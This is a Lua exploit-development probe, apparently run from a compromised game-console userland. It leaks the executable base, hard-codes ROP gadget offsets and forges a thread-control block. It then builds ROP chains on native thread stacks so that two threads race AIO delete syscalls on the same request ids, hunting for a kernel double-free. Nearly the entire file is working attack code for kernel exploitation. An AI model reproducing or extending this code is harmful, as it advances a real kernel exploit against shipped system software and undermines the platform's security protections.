-- CRASH_CLASS: HIGH
-- PROBE 523c: AIO delete race on native threads (fixed stack layout)
--
-- Context: 523a ran 300 iterations of three children racing one freshly
-- created id and always produced exactly one 0 and two 0x80020003: the
-- children start about a millisecond apart, so the losers fail at the FIRST
-- table lookup (slot already removed) and never overlap inside the delete's
-- unlock/re-lookup window. 523b/523c-v1 built long chains from rsp = top - 8
-- and died inside the first thr_new: a thr_new child starts at
-- stack_base + size and runs its chain UPWARD from there, so the chain must
-- live above the stack region, inside the same allocation
-- (docs/THREADING_ALIVE_14_10.md).
--
-- This probe first proves the layout with ONE child deleting 20 ids, then
-- launches TWO children that each delete the same 100 ids. If the delete's
-- post-unlock re-lookup loses the race, two children report status 0 for the
-- same id. Overlaps are printed as they are observed, so a crash after a hit
-- still leaves the evidence.

print("=== PROBE 523c: AIO DELETE RACE (NATIVE) ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("[0] pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
print("[A] eboot=" .. fmt(eb))

local g_pop_rax   = eb + 0x992
local g_pop_rdi   = eb + 0xC9DFE
local g_pop_rsi   = eb + 0xD77D
local g_pop_rdx   = eb + 0x3B02D7
local g_bare_ret  = eb + 0x42

local sigact = memory.alloc(0x20)
wq(N(sigact), uint64(1))
wd(N(sigact) + 8, 0)
wq(N(sigact) + 16, uint64(0))
pcall(function() mk(416)(uint64(11), sigact, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sigact, uint64(0)) end)

local fake_tcb = memory.alloc(0x1000)
local tcb_a = N(fake_tcb)
for i = 0, 0xFFC, 4 do wd(tcb_a + i, 0) end
for i = 0, 0xFF8, 8 do wq(tcb_a + i, uint64(tcb_a)) end
local fs_ptr = memory.alloc(8)
wq(N(fs_ptr), uint64(tcb_a))

local function emit_sysarch_preamble(emit)
    emit(g_pop_rdi);   emit(uint64(129))
    emit(g_pop_rsi);   emit(uint64(N(fs_ptr)))
    emit(g_pop_rax);   emit(uint64(165))
    emit(stub)
end

local IDS = 120
local SMOKE = 20
local RACE_START = SMOKE
local RACE_COUNT = IDS - SMOKE

local sc_create = mk(669)
local sc_poll   = mk(664)
local sc_delete = mk(662)
local sc_thr_new = mk(455)

local data = memory.alloc(0x100)
local out_id = memory.alloc(0x40)
local ids_buf = memory.alloc(IDS * 4 + 64)
local poll_out = memory.alloc(0x40)

local function create_polled()
    for i = 0, 0xFC, 4 do wd(N(data) + i, 0) end
    wq(N(out_id), uint64(0))
    local ok, rv = pcall(function()
        return sc_create(uint64(1), uint64(N(data)), uint64(1), uint64(1), uint64(N(out_id)))
    end)
    if not ok or N(rv) ~= 0 then return nil end
    local id = rd(N(out_id))
    if id == nil then return nil end
    local cell = memory.alloc(16)
    wd(N(cell), id)
    wd(N(poll_out), 0xCCCCCCCC)
    pcall(function() sc_poll(uint64(N(cell)), uint64(1), uint64(N(poll_out))) end)
    return id
end

print(string.format("[B] creating %d polled requests", IDS))
local made = {}
for i = 1, IDS do
    local id = create_polled()
    if id == nil then break end
    made[#made + 1] = id
    wd(N(ids_buf) + (i - 1) * 4, id)
    if i % 40 == 0 then print(string.format("    %d/%d", i, IDS)) end
end
print(string.format("    created=%d", #made))
if #made < IDS then print("    short create; aborting"); return end
if not alive() then print("DEAD while creating"); return end

-- A child that deletes ids [first, first+count) into status[0..count)
local function build_child(first, count)
    local status = memory.alloc(count * 4 + 64)
    for i = 0, count * 4 - 4, 4 do wd(N(status) + i, 0xCCCCCCCC) end

    local CHAIN_MAX = 0x8000
    local stk = memory.alloc(0x8000 + CHAIN_MAX)
    local sb = N(stk)
    local ss = 0x8000
    local rsp = sb + ss - 8   -- kernel rsp is stack_base+size-8 (523a)

    local off = 0
    local function emit(v) wq(rsp + off, v); off = off + 8 end

    emit_sysarch_preamble(emit)
    for i = 0, count - 1 do
        emit(g_pop_rdi); emit(uint64(N(ids_buf) + (first + i) * 4))
        emit(g_pop_rsi); emit(uint64(1))
        emit(g_pop_rdx); emit(uint64(N(status) + i * 4))
        emit(g_pop_rax); emit(uint64(662))
        emit(stub)
    end
    emit(g_pop_rdi); emit(uint64(0))
    emit(g_pop_rax); emit(uint64(431))
    emit(stub)

    local par = memory.alloc(0x40)
    local pa = N(par)
    for i = 0, 0x3C, 4 do wd(pa + i, 0) end
    wq(pa + 0x00, g_bare_ret)
    wq(pa + 0x08, uint64(0))
    wq(pa + 0x10, uint64(sb))
    wq(pa + 0x18, uint64(ss))
    local tid_ptr = memory.alloc(8)
    wq(N(tid_ptr), uint64(0))
    wq(pa + 0x30, tid_ptr)

    return par, status, off
end

-- [C] smoke: one child, 20 deletes, must all be 0
print("")
print(string.format("[C] smoke: one child, %d deletes", SMOKE))
local smoke_par, smoke_status, smoke_len = build_child(0, SMOKE)
print(string.format("    chain bytes=%d", smoke_len))
local ok, rv = pcall(function() return sc_thr_new(smoke_par, uint64(0x38)) end)
print(string.format("    thr_new ok=%s rv=%s alive=%s", tostring(ok), tostring(N(rv)), tostring(alive())))

local spins = 0
local idle = 0
local last = -1
while spins < 100000 do
    local seen = 0
    for i = 0, SMOKE - 1 do if rd(N(smoke_status) + i * 4) ~= -858993460 then seen = seen + 1 end end
    if seen == SMOKE then break end
    if seen == last then idle = idle + 1; if idle > 3000 then break end else idle = 0; last = seen end
    spins = spins + 1
end
local smoke_zero, smoke_other = 0, 0
for i = 0, SMOKE - 1 do
    local v = rd(N(smoke_status) + i * 4)
    if v == 0 then smoke_zero = smoke_zero + 1
    elseif v ~= -858993460 then smoke_other = smoke_other + 1 end
end
print(string.format("    smoke result: zero=%d other=%d alive=%s", smoke_zero, smoke_other, tostring(alive())))
if not alive() then print("DEAD after smoke"); return end

-- [D] race: two children over the same 100 ids
print("")
print(string.format("[D] race: two children x %d deletes", RACE_COUNT))
local pars, stats = {}, {}
for c = 1, 2 do
    local p, st, len = build_child(RACE_START, RACE_COUNT)
    pars[c] = p
    stats[c] = st
    print(string.format("    child %d chain bytes=%d", c, len))
end
for c = 1, 2 do
    local ok2, rv2 = pcall(function() return sc_thr_new(pars[c], uint64(0x38)) end)
    print(string.format("    launch child %d: ok=%s rv=%s alive=%s", c, tostring(ok2), tostring(N(rv2)), tostring(alive())))
end

-- [E] watch for overlap as it happens
print("[E] watching")
local double_zero = 0
local other_status = 0
local dist = {}
local examples = {}
local reported = {}
spins = 0
idle = 0
last = -1
while spins < 200000 do
    for i = 0, RACE_COUNT - 1 do
        if not reported[i] then
            local v1 = rd(N(stats[1]) + i * 4)
            local v2 = rd(N(stats[2]) + i * 4)
            if v1 ~= nil and v1 ~= -858993460 and v2 ~= nil and v2 ~= -858993460 then
                reported[i] = true
                local z = 0
                if v1 == 0 then z = z + 1 end
                if v2 == 0 then z = z + 1 end
                dist[z] = (dist[z] or 0) + 1
                if z >= 2 then
                    double_zero = double_zero + 1
                    print(string.format("    OVERLAP id %d: %08X %08X", made[RACE_START + i + 1], v1, v2))
                end
                if v1 ~= 0 and v1 ~= 0x80020003 and v1 ~= 0x80020010 then
                    other_status = other_status + 1
                    if #examples < 8 then examples[#examples + 1] = string.format("id %d c1 %08X", made[RACE_START + i + 1], v1) end
                end
                if v2 ~= 0 and v2 ~= 0x80020003 and v2 ~= 0x80020010 then
                    other_status = other_status + 1
                    if #examples < 8 then examples[#examples + 1] = string.format("id %d c2 %08X", made[RACE_START + i + 1], v2) end
                end
            end
        end
    end
    local seen = 0
    for i = 0, RACE_COUNT - 1 do if reported[i] then seen = seen + 1 end end
    if seen == RACE_COUNT then break end
    if seen == last then idle = idle + 1; if idle > 4000 then break end else idle = 0; last = seen end
    spins = spins + 1
end

print("[F] TALLY")
for z = 0, 2 do
    if dist[z] then print(string.format("    %d zero(s): %d ids", z, dist[z])) end
end
print(string.format("    ids with >=2 zero statuses: %d", double_zero))
print(string.format("    unexpected status values: %d", other_status))
for i = 1, #examples do print("    " .. examples[i]) end
print(string.format("    alive=%s", tostring(alive())))

if alive() then
    local okc, clean = 0, 0
    for i = 1, 6 do
        local x = create_polled()
        if x ~= nil then
            okc = okc + 1
            local cell = memory.alloc(16)
            wd(N(cell), x)
            local st = memory.alloc(16)
            wd(N(st), 0xCCCCCCCC)
            local dok = pcall(function() sc_delete(uint64(N(cell)), uint64(1), uint64(N(st))) end)
            if dok and rd(N(st)) == 0 then clean = clean + 1 end
        end
    end
    print(string.format("[G] fresh create after storm: created=%d clean-deletes=%d", okc, clean))
end

print("=== PROBE 523c COMPLETE ===")
